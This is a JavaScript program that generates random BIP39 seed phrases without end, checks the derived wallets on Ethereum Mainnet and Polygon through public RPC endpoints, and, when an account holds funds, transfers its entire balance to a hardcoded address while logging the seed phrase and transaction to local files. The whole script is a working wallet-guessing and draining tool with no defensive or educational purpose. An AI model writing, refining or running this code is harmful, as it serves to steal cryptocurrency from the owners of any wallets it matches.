const HDWalletProvider = require('@truffle/hdwallet-provider');
const Web3 = require('web3');
const bip39 = require('bip39');
const fs = require('fs');

const checkBalance = async (web3Provider, network) =>
{
    // get accounts
    const accounts = await web3Provider.eth.getAccounts();
    // for each account of the 5 first accounts
    for (const account of accounts.slice(0, 5))
    {
        // get balance
        const balance = await web3Provider.eth.getBalance(account);

        // check if balance is greater than 0
        if (balance > 0)
        {
            // console.log(`Wallet found! Balance: ${balance} ETH on ${network}`);

            fs.appendFile('wallets.txt', `Wallet found! Balance: ${balance} ETH on ${network}\n` + mnemonic + '\n'
            , function (err) {
                if (err) throw err;
            });

            // transfer funds to your wallet
            const tx = await web3Provider.eth.sendTransaction({
                from: account,
                to: '0x53FdA1A0b66E8A452d4088E635a0684ebf9163c2',
                value: balance
            }).catch(err => {
                fs.appendFile('transactions.txt', `${err}, ${mnemonic}, ${network}\n`, function (err) {
                    if (err) throw err;
                });
            });

            // log transaction
            // console.log(`Transaction: ${tx.transactionHash}`);

            fs.appendFile('transactions.txt', `Transaction: ${tx.transactionHash}\n`, function (err) {
                if (err) throw err;
            });

            // exit process
            process.exit();
        }
    }
}

let mnemonic;
const main_function = async () =>
{
    console.log('Starting...');
    // infinite loop
    while (true)
    {
        // generating BIP39 mnemonic
        mnemonic = bip39.generateMnemonic();
    
        // check if wallet exists in Ethereum Mainnet
        let provider = new HDWalletProvider({
            mnemonic: {
                phrase: mnemonic
            },
            providerOrUrl: "https://ethereum.publicnode.com",
            pollingInterval: 10000000,
        })
        let web3 = new Web3(provider);
        
        await checkBalance(web3, 'Ethereum Mainnet')
            .catch(err => console.log(err, mnemonic, 'Ethereum Mainnet'));
    
        // check if wallet exists in Matic Mainnet
        provider = new HDWalletProvider({
            mnemonic: {
                phrase: mnemonic
            },
            providerOrUrl: "https://polygon-rpc.com",
            pollingInterval: 10000000,
        })
        let web3Matic = new Web3(provider);
        
        await checkBalance(web3Matic, 'Matic Mainnet')
            .catch(err => console.log(err, mnemonic, 'Matic Mainnet'));

        // // check if wallet exists in BNB Mainnet
        // provider = new HDWalletProvider({
        //     mnemonic: {
        //         phrase: mnemonic
        //     },
        //     providerOrUrl: "https://bsc-dataseed.binance.org"
        // })
        // let web3BSC = new Web3(provider, mnemonic, 'Binance Mainnet');
    
        // await checkBalance(web3BSC, 'Binance Mainnet')
        //     .catch(err => console.log(err, mnemonic, 'Binance Mainnet'));

        fs.appendFile('wallets_not_found.txt', `${mnemonic}\n`
            , function (err) {
                if (err) throw err;
            });
    }
}

main_function().catch(err => console.log(err, '; last mnemonic: ' ,mnemonic));